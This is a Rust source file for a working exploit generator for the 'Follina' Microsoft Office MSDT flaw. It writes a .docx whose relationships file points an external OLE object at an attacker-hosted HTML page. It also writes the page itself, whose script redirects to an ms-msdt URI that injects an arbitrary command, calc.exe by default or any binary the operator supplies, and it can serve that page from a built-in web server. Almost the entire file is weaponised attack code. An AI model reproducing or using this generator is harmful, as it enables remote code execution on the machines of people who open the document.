//extern crate local_ip;
pub mod local_ip;

use d::start;
use std::fs::{create_dir_all, write, File};
use std::io::prelude::*;
use std::io::{Seek, Write};
use std::iter::Iterator;
use std::net::{IpAddr, Ipv4Addr, SocketAddr, SocketAddrV4, SocketAddrV6};
use std::path::Path;
use std::process::exit;
use std::str::FromStr;
use walkdir::{DirEntry, WalkDir};
use zip::result::ZipError;
use zip::write::FileOptions;

fn main() {
    println!("****************************************************************");
    println!("*                                                              *");
    println!("*                           Follina                            *");
    println!("*                                                              *");
    println!("*                Good thing we disabeled macros                *");
    println!("*                                                              *");
    println!("****************************************************************");

    let ifaces_list = local_ip::get_ifaces();
    let args: Vec<_> = std::env::args().collect();
    let docx_name = "document.docx".to_string();
    let html_name = "exploit.html".to_string();
    let mut binary = "\\\\windows\\\\system32\\\\calc";
    let mut ip: IpAddr = IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1));
    let mut port = 8080;
    let mut start_httpd = false;

    if args.len() >= 2 {
        if args[1] == "--help" {
            usage(&args[0]);
            exit(0)
        } else if args[1] == "--server" {
            start_httpd = true;
            if args.len() >= 4 {
                let iface = args[2].trim();
                let ifaces_listing = ifaces_list.clone();
                if ifaces_list.contains(&iface.to_string()) {
                    let opt_local_ip = local_ip::get_iface_addr(iface);
                    if opt_local_ip.is_some() {
                        ip = local_ip::get_iface_addr(iface).unwrap();
                    } else {
                        println!("Interface has no IP address.");
                        exit(1)
                    }
                } else {
                    println!(
                        "Network interface {} not found. Possible interfaces are:",
                        iface
                    );
                    for itf in ifaces_listing {
                        if itf != "" {
                            println!("* {}", itf);
                        }
                    }
                    exit(1);
                }
                binary = args[3].trim();
            } else {
                ip = IpAddr::from_str("127.0.0.1").unwrap();
                if args.len() > 2 {
                    binary = args[2].trim();
                } else {
                    binary = "\\\\windows\\\\system32\\\\calc.exe"
                }
            }
        } else {
            start_httpd = false;
            if args.len() == 4 {
                let addr = IpAddr::from_str(&args[1]);
                ip = match addr {
                    Ok(_) => addr.unwrap(),
                    Err(_) => {
                        println!("First argument is not an IP Address.");
                        exit(1);
                    }
                };
                let opt_portnum = args[2].trim().parse::<i32>();

                match opt_portnum {
                    Ok(value) => {
                        if get_type_of(&value) == "i32" {
                            let portnum: i32 = value;
                            if portnum > 0 && portnum <= 65535 {
                                port = portnum;
                            } else {
                                println!("Second argument must be a port number.");
                                exit(1);
                            }
                        } else {
                            println!("Second argument must be a port number.");
                            exit(1);
                        }
                    }
                    Err(_) => {
                        println!("Second argument must be a port number.");
                        exit(1);
                    }
                }
                binary = args[3].trim();
            };
        }
    }

    println!(
        "Generating files 

Configuration:
        IP     = {}
        Port   = {}
        Binary = {}\n",
        ip, port, binary
    );

    let payload_url = format!("http://{}:{}/exploit.html", ip, port);

    let _ = create_dir_all("./www");

    let _ = generate_html(html_name, binary);
    let _ = generate_docx(docx_name, payload_url);

    if start_httpd == true {
        println!("\nServer Ready at {}:{}", ip, port);
    } else {
        println!(
            "\nNo server started. Please copy ./www/exploit.html to the webserver at {} on port {}",
            ip, port
        );
    }
    if start_httpd == true {
        let socket: SocketAddr;
        match ip {
            IpAddr::V4(ipv4) => {
                let socket_v4 = SocketAddrV4::new(ipv4, 8080);
                socket = SocketAddr::V4(socket_v4);
            }
            IpAddr::V6(ipv6) => {
                let socket_v6 = SocketAddrV6::new(ipv6, 8080, 0, 0);
                socket = SocketAddr::V6(socket_v6);
            }
        };
        let _ = start(&socket, "./www");
    }
}

fn usage(cmd: &str) {
    println!(
        "Usage: {} <ip addr> <port> <binary to execute>             
        # Manual mode : Only genetrates docx and html files ",
        cmd
    );
    println!(
        "Usage: {}
        # Manual mode : Only genetrates docx and html files pointing to 127.0.0.1:8080 and launching calc.exe",
        cmd
    );
    println!("Usage: {} --server
        # Server mode : Genetrates docx and html files and bind a web server to localhost:8080, the exploit launches calc.exe", cmd);
    println!(
        "Usage: {} --server <binary to execute>                     
        # Server mode : Genetrates docx and html files and bind a web server to localhost:8080",
        cmd
    );
    println!(
        "Usage: {} --server <network interface> <binary to execute> 
        # Server mode : Genetrates docx and html files and bind a web server to iface_ip_addr:8080",
        cmd
    );
    println!(
        "Usage: {} --help                                           # Print this message.",
        cmd
    );
}

fn get_type_of<T>(_: &T) -> &str {
    std::any::type_name::<T>()
}

fn generate_docx(docx_name: String, payload_url: String) {
    let filename = format!("./www/{}", docx_name);
    let relsfile = "docx/word/_rels/document.xml.rels";

    let _ = write(relsfile, tpl(payload_url));
    let _ = create_docx(&filename);
}

fn generate_html(html_name: String, binary: &str) {
    let filename = format!("./www/{}", html_name);

    let _ = write(filename, html(binary));
    println!("Created ./www/{}", html_name);
}

fn payload(binary: &str) -> String {
    format!("\"ms-msdt:/id PCWDiagnostic /skip force /param \\\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$({})/.exe\\\"\"", binary)
}

fn tpl(payload_url: String) -> String {
    format!("<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>
<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId8\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/footer\" Target=\"footer1.xml\"/><Relationship Id=\"rId13\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme\" Target=\"theme/theme1.xml\"/><Relationship Id=\"rId3\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/webSettings\" Target=\"webSettings.xml\"/><Relationship Id=\"rId7\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/header\" Target=\"header2.xml\"/><Relationship Id=\"rId12\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/fontTable\" Target=\"fontTable.xml\"/><Relationship Id=\"rId2\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings\" Target=\"settings.xml\"/><Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles\" Target=\"styles.xml\"/><Relationship Id=\"rId6\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/header\" Target=\"header1.xml\"/><Relationship Id=\"rId11\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/footer\" Target=\"footer3.xml\"/><Relationship Id=\"rId5\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/endnotes\" Target=\"endnotes.xml\"/><Relationship Id=\"rId10\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/header\" Target=\"header3.xml\"/><Relationship Id=\"rId4\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/footnotes\" Target=\"footnotes.xml\"/><Relationship Id=\"rId1337\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject\" Target=\"mhtml:{0}!x-usc:{0}\" TargetMode=\"External\"/><Relationship Id=\"rId9\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/footer\" Target=\"footer2.xml\"/></Relationships>", payload_url)
}

fn html(binary: &str) -> String {
    format!("<!doctype html>
<html lang=\"en\">
<head>
<title>
Good thing we disabled macros
</title>
</head>
<body>
<p>
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque pellentesque egestas nulla in dignissim. Nam id mauris lorem. Nunc suscipit id magna id mollis. Pellentesque suscipit orci neque, at ornare sapien bibendum eu. Vestibulum malesuada nec sem quis finibus. Nam quis ligula et dui faucibus faucibus. In quis bibendum tortor.

Curabitur rutrum leo tortor, venenatis fermentum ex porttitor vitae. Proin eu imperdiet lorem, ac aliquet risus. Aenean eu sapien pharetra, imperdiet ipsum ut, semper diam. Nulla facilisi. Sed euismod tortor tortor, non eleifend nunc fermentum sit amet. Integer ligula ligula, congue at scelerisque sit amet, porttitor quis felis. Maecenas nec justo varius, semper turpis ut, gravida lorem. Proin arcu ligula, venenatis aliquam tristique ut, pretium quis velit.

Phasellus tristique orci enim, at accumsan velit interdum et. Aenean nec tristique ante, dignissim convallis ligula. Aenean quis felis dolor. In quis lectus massa. Pellentesque quis pretium massa. Vivamus facilisis ultricies massa ac commodo. Nam nec congue magna. Nullam laoreet justo ut vehicula lobortis.

Aliquam rutrum orci tortor, non porta odio feugiat eu. Vivamus nulla mauris, eleifend eu egestas scelerisque, vulputate id est. Proin rutrum nec metus convallis ornare. Ut ultricies ante et dictum imperdiet. Ut nisl magna, porttitor nec odio non, dapibus maximus nibh. Integer lorem felis, accumsan a dapibus hendrerit, maximus nec leo. Vestibulum porta, orci sed dignissim porta, sem justo porta odio, quis rutrum tortor arcu quis massa. Aenean eleifend nisi a quam faucibus, quis scelerisque lectus condimentum. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Proin non dui nec odio finibus molestie. Suspendisse id massa nunc. Sed ultricies et sapien vel fringilla.
</p>
<p>
Donec tincidunt ac justo et iaculis. Pellentesque lacinia, neque at consectetur porttitor, leo eros bibendum lorem, eu sollicitudin dolor urna pharetra augue. Pellentesque facilisis orci quis ante tempor, ac varius eros blandit. Nulla vulputate, purus eu consectetur ullamcorper, mauris nulla commodo dolor, in maximus purus mi eget purus. In mauris diam, imperdiet ac dignissim ut, mollis in purus. In congue volutpat tortor eu auctor. Nullam a eros lectus. Aenean porta semper quam ac lacinia. Curabitur interdum, nisl eu laoreet tempus, augue nisl volutpat odio, dictum aliquam massa orci sit amet magna.

Duis pulvinar vitae neque non placerat. Nullam at dui diam. In hac habitasse platea dictumst. Sed quis mattis libero. Nullam sit amet condimentum est. Nulla eget blandit elit. Nunc facilisis erat nec ligula ultrices, malesuada mollis ex porta. Phasellus iaculis lorem eu augue tincidunt, in ultrices massa suscipit. Donec gravida sapien ac dui interdum cursus. In finibus eu dolor sit amet porta. Sed ultrices nisl dui, at lacinia lectus porttitor ut.

Ut ac viverra risus. Suspendisse lacus nunc, porttitor facilisis mauris ut, ullamcorper gravida dolor. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Vivamus sollicitudin, arcu id sagittis facilisis, turpis dolor eleifend massa, in maximus sapien dui et tortor. Quisque varius enim sed enim venenatis tempor. Praesent quis volutpat lorem. Pellentesque ac venenatis lacus, vitae commodo odio. Sed in metus at libero viverra mollis sed vitae nibh. Sed at semper lectus.
</p>
<p>
Proin a interdum justo. Duis sed dui vitae ex molestie egestas et tincidunt neque. Fusce lectus tellus, pharetra id ex at, consectetur hendrerit nibh. Nulla sit amet commodo risus. Nulla sed dapibus ante, sit amet fringilla dui. Nunc lectus mauris, porttitor quis eleifend nec, suscipit sit amet massa. Vivamus in lectus erat. Nulla facilisi. Vivamus sed massa quis arcu egestas vehicula. Nulla massa lorem, tincidunt sed feugiat quis, faucibus a risus. Sed viverra turpis sit amet metus iaculis finibus.

Morbi convallis fringilla tortor, at consequat purus vulputate sit amet. Morbi a ultricies risus, id maximus purus. Fusce aliquet tortor id ante ornare, non auctor tortor luctus. Quisque laoreet, sem id porttitor eleifend, eros eros suscipit lectus, id facilisis lorem lorem nec nibh. Nullam venenatis ornare ornare. Donec varius ex ac faucibus condimentum. Aenean ultricies vitae mauris cursus ornare. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Maecenas aliquet felis vel nulla auctor, ac tempor mi mattis. Nam accumsan nisi vulputate, vestibulum nisl at, gravida erat. Nam diam metus, tempor id sapien eu, porta luctus felis. Aliquam luctus vitae tortor quis consectetur. In rutrum neque sit amet fermentum rutrum. Sed a velit at metus pretium tincidunt tristique eget nibh. In ultricies, est ut varius pulvinar, magna purus tristique arcu, et laoreet purus elit ac lectus. Ut venenatis tempus magna, non varius augue consectetur ut.

Etiam elit risus, ullamcorper cursus nisl at, ultrices aliquet turpis. Maecenas vitae odio non dolor venenatis varius eu ac sem. Phasellus id tortor tellus. Ut vehicula, justo ac porta facilisis, mi sapien efficitur ipsum, sit fusce.
</p>
<script>
    location.href = {};
</script>

</body>
</html>\n", payload(binary))
}

const METHOD: Option<zip::CompressionMethod> = Some(zip::CompressionMethod::Deflated);

fn create_docx(docx_name: &str) {
    let src_dir = "docx/";
    let method = METHOD;
    match doit(src_dir, docx_name, method.unwrap()) {
        Ok(_) => println!("Created {}", docx_name),
        Err(e) => println!("Error: {:?}", e),
    }
}

fn zip_dir<T>(
    it: &mut dyn Iterator<Item = DirEntry>,
    prefix: &str,
    writer: T,
    method: zip::CompressionMethod,
) -> zip::result::ZipResult<()>
where
    T: Write + Seek,
{
    let mut zip = zip::ZipWriter::new(writer);
    let options = FileOptions::default()
        .compression_method(method)
        .unix_permissions(0o755);

    let mut buffer = Vec::new();
    for entry in it {
        let path = entry.path();
        let name = path.strip_prefix(Path::new(prefix)).unwrap();

        // Write file or directory explicitly
        // Some unzip tools unzip files with directory paths correctly, some do not!
        if path.is_file() {
            #[allow(deprecated)]
            zip.start_file_from_path(name, options)?;
            let mut f = File::open(path)?;

            f.read_to_end(&mut buffer)?;
            zip.write_all(&*buffer)?;
            buffer.clear();
        } else if !name.as_os_str().is_empty() {
            // Only if not root! Avoids path spec / warning
            // and mapname conversion failed error on unzip
            #[allow(deprecated)]
            zip.add_directory_from_path(name, options)?;
        }
    }
    zip.finish()?;
    Result::Ok(())
}

fn doit(
    src_dir: &str,
    dst_file: &str,
    method: zip::CompressionMethod,
) -> zip::result::ZipResult<()> {
    if !Path::new(src_dir).is_dir() {
        return Err(ZipError::FileNotFound);
    }

    let path = Path::new(dst_file);
    let file = File::create(&path).unwrap();

    let walkdir = WalkDir::new(src_dir);
    let it = walkdir.into_iter();

    zip_dir(&mut it.filter_map(|e| e.ok()), src_dir, file, method)?;

    Ok(())
}
